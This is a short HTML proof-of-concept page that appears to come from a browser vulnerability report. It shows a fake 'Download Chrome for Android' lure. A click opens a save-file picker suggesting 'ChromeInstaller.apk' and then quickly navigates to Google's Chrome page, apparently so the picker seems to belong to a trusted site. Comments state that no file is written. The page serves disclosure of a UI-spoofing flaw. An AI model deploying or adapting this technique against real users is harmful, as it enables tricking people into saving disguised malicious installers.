<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>PoC</title>
<style>
body {
    margin: 0;
    height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    font-family: Arial, sans-serif;
}
.cta {
    text-align: center;
}
</style>
</head>
<body>

<div class="cta">
    <h1>Download Chrome for Android</h1>
    <p>Click anywhere to continue</p>
</div>

<script>
document.addEventListener('click', async () => {
    if (!('showSaveFilePicker' in window)) return;

    try {
        // Step 1: Trigger picker with sensitive-looking filename
        const pickerPromise = window.showSaveFilePicker({
            suggestedName: 'ChromeInstaller.apk',
            types: [{
                description: 'Android Package (demo)',
                accept: { 'application/octet-stream': ['.apk'] }
            }]
        });

        // Step 2: Navigate shortly after picker appears
        setTimeout(() => {
            window.location.href = 'https://www.google.com/chrome/';
        }, 250);

        // Step 3: Await picker (no write performed)
        await pickerPromise;

        // IMPORTANT:
        // No createWritable()
        // No write()
        // This is intentional & safe

    } catch (e) {
        // User cancel / abort is expected
    }
}, { once: true });
</script>

</body>
</html>
